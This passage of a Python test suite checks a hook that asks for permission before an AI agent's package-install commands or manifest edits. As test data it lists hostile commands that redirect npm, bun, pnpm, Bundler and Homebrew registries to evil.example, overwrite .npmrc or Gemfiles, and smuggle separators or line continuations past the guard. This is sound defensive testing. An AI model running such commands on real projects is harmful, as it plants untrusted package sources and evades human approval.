    ),
    BashCase("xargs only in a comment", "bun install # run in parallel", ask=False),
    # Variables that move the registry or the configuration.
    BashCase(
        "npm_config_registry",
        "npm_config_registry=https://evil.example npm install",
        ask=True,
    ),
    BashCase(
        "NPM_CONFIG_USERCONFIG",
        "NPM_CONFIG_USERCONFIG=/tmp/evil.npmrc npm install",
        ask=True,
    ),
    BashCase(
        "BUN_CONFIG_REGISTRY",
        "BUN_CONFIG_REGISTRY=https://evil.example bun install",
        ask=True,
    ),
    BashCase(
        "pnpm_config_registry",
        "pnpm_config_registry=https://evil.example pnpm i",
        ask=True,
    ),
    BashCase(
        "registry variable through env",
        "env npm_config_registry=https://evil.example npm install",
        ask=True,
    ),
    BashCase(
        "registry variable exported earlier",
        "export npm_config_registry=https://evil.example; npm install",
        ask=True,
    ),
    BashCase(
        "quoted variable name",
        "npm_con''fig_registry=https://evil.example npm install",
        ask=True,
    ),
    BashCase(
        "BUNDLE_MIRROR",
        "BUNDLE_MIRROR__ALL=https://evil.example bundle install",
        ask=True,
    ),
    BashCase(
        "BUNDLE_APP_CONFIG", "BUNDLE_APP_CONFIG=/tmp/evil bundle install", ask=True
    ),
    BashCase(
        "HOMEBREW_BOTTLE_DOMAIN",
        "HOMEBREW_BOTTLE_DOMAIN=https://evil.example brew bundle",
        ask=True,
    ),
    BashCase(
        "registry variable without an install",
        "npm_config_registry=https://x.test npm run build",
        ask=False,
    ),
    # A separator inside a quoted or escaped word cuts it short.
    BashCase(
        "quoted pipe after a vetted flag",
        "npm install '--no-audit|' left-pad",
        ask=True,
    ),
    BashCase(
        "quoted semicolon after a vetted flag",
        'npm install "--no-audit;" left-pad',
        ask=True,
    ),
    BashCase(
        "quoted separator with a space",
        'bun install "--frozen-lockfile; " left-pad',
        ask=True,
    ),
    BashCase(
        "quoted hash after a vetted flag",
        'npm install "--no-audit #" left-pad',
        ask=True,
    ),
    BashCase(
        "quoted separator in a global flag",
        "bun --cwd '--help; ' i left-pad",
        ask=True,
    ),
    BashCase(
        "install inside double-quoted sh -c",
        'sh -c "npm install --no-audit"',
        ask=False,
    ),
    BashCase(
        "install between commands inside sh -c",
        "sh -c 'echo a; npm install --no-audit; echo b'",
        ask=False,
    ),
    BashCase(
        "quoted flag inside a double-quoted command",
        "ssh host \"npm install '--no-audit'\"",
        ask=False,
    ),
    BashCase(
        "apostrophe in an earlier quoted word",
        'echo "it\'s" && npm install --no-audit',
        ask=False,
    ),
    BashCase("install inside sh -c", "sh -c 'npm install --no-audit'", ask=False),
    BashCase(
        "install inside bash -lc after cd",
        'bash -lc "cd app && npm install --no-audit"',
        ask=False,
    ),
    BashCase(
        "quoted phrase that ends in a manager and a word",
        'git commit -m "brew update"',
        ask=False,
    ),
    BashCase("quoted phrase searched for", 'rg "bun test" .', ask=False),
    # Flags, redirections and values before the subcommand.
    BashCase(
        "registry flag before the subcommand",
        "npm --registry=https://evil.example install",
        ask=True,
    ),
    BashCase(
        "registry flag with a separate value",
        "npm --registry https://evil.example install",
        ask=True,
    ),
    BashCase(
        "userconfig flag before the subcommand",
        "npm --userconfig=/tmp/evil.npmrc install",
        ask=True,
    ),
    BashCase(
        "bun config flag before the subcommand",
        "bun --config=/tmp/evil.toml install",
        ask=True,
    ),
    BashCase(
        "pnpm config flag before the subcommand",
        "pnpm --config.registry=https://evil.example install",
        ask=True,
    ),
    BashCase("unknown flag before the subcommand", "pnpm -C app install", ask=True),
    BashCase("vetted flag before the subcommand", "npm --offline install", ask=False),
    BashCase(
        "vetted flag and value before the subcommand",
        "npm --prefix app --silent install --no-audit",
        ask=False,
    ),
    BashCase("flag value from a variable", "pnpm --filter $PKG install", ask=True),
    BashCase(
        "redirect between manager and subcommand",
        "npm 2>/dev/null install left-pad",
        ask=True,
    ),
    BashCase(
        "bare redirect between manager and subcommand",
        "bun > out.log i left-pad",
        ask=True,
    ),
    BashCase(
        "vetted install with a redirect before it",
        "pnpm 2>&1 install --frozen-lockfile",
        ask=False,
    ),
    BashCase(
        "flag value named like a manager",
        "npm --prefix tools/brew install left-pad",
        ask=True,
    ),
    BashCase(
        "flag value named like bundle",
        "bun --cwd packages/bundle i left-pad",
        ask=True,
    ),
    BashCase(
        "add behind a manager-named value", "pnpm --dir apps/bun add zod", ask=True
    ),
    BashCase(
        "vetted install behind a manager-named value",
        "npm --prefix tools/brew install --no-audit",
        ask=False,
    ),
    BashCase("bundle with a gemfile flag", "bundle --gemfile=evil/Gemfile", ask=True),
    BashCase("bundle with no subcommand", "bundle", ask=False),
    BashCase("bundle version", "bundle --version", ask=False),
    BashCase(
        "bundle with a gemfile variable",
        "BUNDLE_GEMFILE=x/Gemfile bundle",
        ask=True,
    ),
    BashCase("bundle abbreviation", "bundle i --gemfile=evil/Gemfile", ask=True),
    BashCase("bundle long abbreviation", "bundle inst --path vendor", ask=True),
    BashCase("bundle vetted abbreviation", "bundle ins --quiet", ask=False),
    BashCase("bundle inject abbreviation", "bundle inj rack 1.0", ask=True),
    BashCase("npm install-test prefix", "npm install-t left-pad", ask=True),
    BashCase("npm install-test longer prefix", "npm install-tes left-pad", ask=True),
    BashCase("upper-case manager", "NPM install left-pad", ask=True),
    BashCase("upper-case manager without packages", "NPM install", ask=False),
    BashCase(
        "install after a long run of flags",
        "npm " + "--x " * 100 + "install",
        ask=True,
    ),
    # Comments and wrapper prefixes in front of text.
    BashCase(
        "install named in a trailing comment", "ls # npm install left-pad", ask=False
    ),
    BashCase(
        "manager named in a comment after a flag", "bun test # bun add zod", ask=False
    ),
    BashCase("assignment before echo", "FOO=1 echo npm install left-pad", ask=False),
    BashCase("time before echo", "time echo bun install left-pad", ask=False),
    BashCase("env before grep", "env LC_ALL=C grep -rn 'bun install' .", ask=False),
    BashCase("env split string", 'env -S "npm install left-pad"', ask=True),
    # Files that an install reads or runs.
    BashCase(
        "append to a Gemfile",
        "echo 'gem \"evil\"' >> Gemfile && bundle install",
        ask=True,
    ),
    BashCase("write gems.rb", "printf 'gem \"x\"' | tee gems.rb", ask=True),
    BashCase("edit a gemspec in place", "sed -i s/a/b/ foo.gemspec", ask=True),
    BashCase(
        "write a registry into .npmrc",
        "printf 'registry=https://evil.example/\\n' > .npmrc && npm install",
        ask=True,
    ),
    BashCase("write bunfig.toml", "echo '[install]' > bunfig.toml", ask=True),
    BashCase(
        "write .pnpmfile.cjs", "echo 'module.exports={}' > .pnpmfile.cjs", ask=True
    ),
    BashCase(
        "write pnpm-workspace.yaml",
        "echo 'packages: []' > pnpm-workspace.yaml && pnpm install",
        ask=True,
    ),
    BashCase("read a Gemfile", "cat Gemfile && bundle exec rake", ask=False),
    BashCase("read .npmrc", "cat .npmrc | grep registry", ask=False),
    # Other ways to change a manifest from the shell.
    BashCase("copy over package.json", "cp /tmp/evil.json package.json", ask=True),
    BashCase(
        "move over package.json", "mv p.tmp package.json && npm install", ask=True
    ),
    BashCase(
        "download package.json",
        "curl -sSL https://x.test/package.json -o package.json",
        ask=True,
    ),
    BashCase("wget a manifest", "wget -O Cargo.toml https://x.test/c", ask=True),
    BashCase("rsync a lockfile", "rsync -a other/bun.lock bun.lock", ask=True),
    BashCase("patch a manifest", "patch package.json < deps.diff", ask=True),
    BashCase("npm pkg set", "npm pkg set dependencies.evil=1.0.0 && npm i", ask=True),
    BashCase("pnpm pkg set", "pnpm pkg set dependencies.evil=1.0.0", ask=True),
    BashCase("npm pkg get", "npm pkg get name version", ask=False),
    BashCase("copy something else", "cp src/main.ts /tmp/main.ts", ask=False),
    BashCase("fetch an API", "curl -s https://example.com/api -o out.json", ask=False),
    # Commands that take long to match are cut off and ask.
    BashCase(
        "long run of redirects",
        "echo " + ">" * 25_000 + "; npm install left-pad",
        ask=True,
    ),
    BashCase(
        "repeated interpreter flags",
        "npm install left-pad # " + "bun -e " * 500,
        ask=True,
    ),
    BashCase(
        "copy a manifest into a directory",
        "cp package.json bun.lock $d/ && cd $d && bun install --frozen-lockfile",
        ask=False,
    ),
    BashCase(
        "regex alternation inside quotes",
        "grep -n 'node --test\\|bun test\\|foo' Makefile",
        ask=False,
    ),
    # Redirections glued to a word and continuation lines inside one.
    BashCase(
        "redirect glued to the subcommand",
        "npm install>/dev/null left-pad",
        ask=True,
    ),
    BashCase("redirect glued to an alias", "bun i>/dev/null left-pad", ask=True),
    BashCase(
        "vetted install with a glued redirect",
        "bun install --frozen-lockfile>log",
        ask=False,
    ),
    BashCase(
        "continuation inside the manager name",
        "n\\\npm install left-pad",
        ask=True,
    ),
    BashCase(
        "continuation inside the subcommand",
        "bun inst\\\nall left-pad",
        ask=True,
    ),
)


# The hook has 10 s in settings.json and fails open past that, so a pattern whose
# cost grows faster than its input must fail here. CPU time measures that, and a
# loaded host stretches wall-clock time without changing it.
CPU_LIMIT = 2.0


def run_hook(payload: Mapping[str, object]) -> tuple[bool, str]:
    """Run the hook, returning (asked, reason)."""
    before = resource.getrusage(resource.RUSAGE_CHILDREN)
    result = subprocess.run(
        [sys.executable, str(HOOK)],
        input=json.dumps(payload),
        capture_output=True,
        text=True,
        check=False,
        timeout=120,
    )
    after = resource.getrusage(resource.RUSAGE_CHILDREN)
    cpu = (after.ru_utime - before.ru_utime) + (after.ru_stime - before.ru_stime)
    assert cpu < CPU_LIMIT, f"the hook used {cpu:.1f} s of CPU"
    # The hook only ever exits 0 (it prints an ask decision or nothing), so any
    # non-zero exit is a real failure — a syntax error or crash.
    assert result.returncode == 0, result.stderr.strip()
    out = result.stdout.strip()
    if not out:
        return False, ""
    response = cast("dict[str, dict[str, str]]", json.loads(out))
    decision = response["hookSpecificOutput"]
    assert decision.get("hookEventName") == "PreToolUse", decision
    assert decision.get("permissionDecisionReason"), decision
    return decision["permissionDecision"] == "ask", decision["permissionDecisionReason"]


def check(payload: Mapping[str, object], *, ask: bool) -> None:
    asked, reason = run_hook(payload)
    wanted = "ask" if ask else "silence"
    got = f"ask ({reason})" if asked else "silence"
    assert asked == ask, f"expected {wanted}, got {got}"
    assert "Dependency guard failed" not in reason, reason


@pytest.mark.parametrize("case", CASES, ids=[case.label for case in CASES])
def test_file_edit(case: Case, tmp_path: Path) -> None:
    # tmp_path is fresh per case, which keeps Write-to-a-new-file honest.
    target = tmp_path / (case.filename or "pyproject.toml")
    if case.filename:
        _ = target.write_text(case.before, encoding="utf-8")
    payload = {
        "hook_event_name": "PreToolUse",
        "tool_name": case.tool,
        "tool_input": {"file_path": str(target), **case.tool_input},
    }
    check(payload, ask=case.ask)


@pytest.mark.parametrize("case", BASH_CASES, ids=[case.label for case in BASH_CASES])
def test_bash_command(case: BashCase) -> None:
    payload = {
        "hook_event_name": "PreToolUse",
        "tool_name": case.tool,
        "tool_input": {"command": case.command},
    }
    check(payload, ask=case.ask)


WATCHDOG_SCRIPT = """\
import importlib.util
import sys

spec = importlib.util.spec_from_file_location("guard", sys.argv[1])
guard = importlib.util.module_from_spec(spec)
spec.loader.exec_module(guard)
guard.WALL_BUDGET = 0.3


def spin(payload):
    while True:
        pass


guard._reason = spin
guard.main()
"""


def test_hook_asks_when_it_runs_out_of_time() -> None:
    result = subprocess.run(
        [sys.executable, "-c", WATCHDOG_SCRIPT, str(HOOK)],
        input=json.dumps({"tool_name": "Bash", "tool_input": {"command": "true"}}),
        capture_output=True,
        text=True,
        check=False,
        timeout=60,
    )
    assert result.returncode == 0, result.stderr
    response = cast("dict[str, dict[str, str]]", json.loads(result.stdout))
    decision = response["hookSpecificOutput"]
    assert decision["permissionDecision"] == "ask"
    assert "OutOfTime" in decision["permissionDecisionReason"]
